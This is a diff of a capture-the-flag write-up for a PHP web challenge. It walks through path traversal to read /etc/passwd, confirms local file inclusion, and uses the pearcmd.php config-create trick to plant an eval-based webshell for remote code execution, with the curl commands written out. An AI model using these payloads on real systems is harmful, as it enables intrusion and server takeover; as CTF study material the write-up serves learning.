@@ -1,14 +1,26 @@
 # Sourceless Guessy Flag
+![](Pasted%20image%2020220606004054.png)
+![](Pasted%20image%2020220606004112.png)
 
 ## Solution (Baby Flag)
 
 ![](Pasted%20image%2020220604215622.png)
 
-Hint is directory traversal, so tried accessing stuff
+The hint for this challenge is file path traversal. A brief summary of file path traversal (if you haven't read the hint)
+
+1. Web server code wants to access a local file. In this case is `sourcelessguessyweb.chall.seetf.sg:1337/?page=whysoserious`
+	1. the `whysoserious` is a file that is in the current directory.
+2. In Linux, you can use `../` to traverse up one directory. You can chain multiple of those together to traverse back up multiple directories (eg. `../../../` for 3 directories)
+	1. You can just spam `../` until you reach root. eg. even though in phpinfo.php the current working directory is `/var/www/html`, you can theoretically spam 3 or more of `../` to reach the root directory
+	2. For example, http://sourcelessguessyweb.chall.seetf.sg:1337/?page=../../../../../../etc/passwd
+3. Once you traverse to the root directory, you can access most files from the root directory, like `/etc/passwd`
+	1. This is subject to the user running the web server (eg. `www-data` running the `apache2` web server) has sufficient permissions to access the file
+	2. This means you can't just anyhow access files which require root access like `/etc/shadow`. The current user does not have enough permissions
+	3. Since you can't anyhow access files, most people use this path traversal vulnerability and lead to remote code execution
 
 ![](Pasted%20image%2020220604215640.png)
 
-Standard hacking protocol calls me to access `/etc/passwd` and read the source code, and so I did
+The standard hacking protocol calls me to access `/etc/passwd`, as it is able to be read by any user. It is the file that provides the list of users in Linux, along with other details like their home directories.
 
 ```
 (base) [hacker@hackerbook ~]$ curl http://sourcelessguessyweb.chall.seetf.sg:1337/?page=../../../etc/passwd
@@ -44,7 +56,48 @@ SEE{2nd_fl4g_n33ds_RCE_g00d_luck_h4x0r}
 
 ## Solution (RCE Flag)
 
-### How I found out in the CTF
+### Confirming LFI or just Directory Traversal
+
+This is likely overlooked, but there's a difference between Local File Inclusion and Directory Traversal
+
+Local File Inclusion (LFI) | Only Directory Traversal
+-|-
+File is loaded and Executed as code | File is loaded, and only shown as text in the resultant webpage
+
+It's a good idea to confirm that the Directory Traversal vulnerability is actually LFI and can run code. If it can run code, we can use this vulnerability to access custom code and lead to Remote Code Execution. Else, we have to try to leak an important file which allows for RCE, which is unlikely in a Docker Container.
+
+Firstly, on opening the first link from the home page, we are directed to a `phpinfo` page
+
+![](Pasted%20image%2020220606010054.png)
+
+I tried traversing to that file to test if code is executed in the vulnerability. If it is not, the text returned should be something like `<?phpinfo();?>`, to show the contents of the `phpinfo.php` file.
+
+Fortunately, I instead got the output of phpinfo, showing that it is an LFI vulnerability
+
+```
+$ curl "http://sourcelessguessyweb.chall.seetf.sg:1337/?page=../../../tmp/hi.php" 
+
+...
+
+</td></tr>
+</table>
+<table>
+<tr><td class="e">System </td><td class="v">Linux app-6799f56885-p78l5 5.4.170+ #1 SMP Wed Mar 23 10:13:41 PDT 2022 x86_64 </td></tr>
+<tr><td class="e">Build Date </td><td class="v">May 13 2022 22:25:02 </td></tr>
+<tr><td class="e">Build System </td><td class="v">Linux 919d1ff24703 5.10.0-13-cloud-amd64 #1 SMP Debian 5.10.106-1 (2022-03-17) x86_64 GNU/Linux </td></tr>
+<tr><td class="e">Configure Command </td><td class="v"> &#039;./configure&#039;  &#039;--build=x86_64-linux-gnu&#039; &#039;--with-config-file-path=/usr/local/etc/php&#039; &#039;--with-config-file-scan-dir=/usr/local/etc/php/conf.d&#039; &#039;--enable-option-checking=fatal&#039; &#039;--with-mhash&#039; &#039;--with-pic&#039; &#039;--enable-ftp&#039; &#039;--enable-mbstring&#039; &#039;--enable-mysqlnd&#039; &#039;--with-password-argon2&#039; &#039;--with-sodium=shared&#039; &#039;--with-pdo-sqlite=/usr&#039; &#039;--with-sqlite3=/usr&#039; &#039;--with-curl&#039; &#039;--with-iconv&#039; &#039;--with-openssl&#039; &#039;--with-readline&#039; &#039;--with-zlib&#039; &#039;--disable-phpdbg&#039; &#039;--with-pear&#039; &#039;--with-libdir=lib/x86_64-linux-gnu&#039; &#039;--disable-cgi&#039; &#039;--with-apxs2&#039; &#039;build_alias=x86_64-linux-gnu&#039; </td></tr>
+<tr><td class="e">Server API </td><td class="v">Apache 2.0 Handler </td></tr>
+<tr><td class="e">Virtual Directory Support </td><td class="v">disabled </td></tr>
+<tr><td class="e">Configuration File (php.ini) Path </td><td class="v">/usr/local/etc/php </td></tr>
+<tr><td class="e">Loaded Configuration File </td><td class="v">(none) </td></tr>
+<tr><td class="e">Scan this dir for additional .ini files </td><td class="v">/usr/local/etc/php/conf.d </td></tr>
+<tr><td class="e">Additional .ini files parsed </td><td class="v">/usr/local/etc/php/conf.d/docker-php-ext-sodium.ini
+ </td></tr>
+
+```
+
+
+### How I found the exploit in the CTF
 
 I randomly tried accessing `/tmp/hi.php` because I tried creating it via another exploit (phpinfo LFI to RCE). Never expect someone else already create it. It included the file `/usr/local/lib/php/pearcmd.php` and realised this could lead to a webshell.
 
@@ -129,7 +182,8 @@ First I tested that the file I'm creating does not exist yet
 </html>
 ```
 
-Creating a webshell file to access via LFI later.
+Creating a webshell file to access via LFI later. I modified `/test.php?+config-create+/&file=/usr/share/php/pearcmd.php&/<?=eval($_POST[1])?>+/tmp/hello.php`, especially the file path and the LFI parameter to fit the context.
+
 
 ```html
 (base) [hacker@hackerbook tmp]$ curl "http://sourcelessguessyweb.chall.seetf.sg+config-create+/&page=../../../usr/local/lib/php/pearcmd.php&/<?=eval(\$_POST\[1\])?>+/tmp/eval.php"
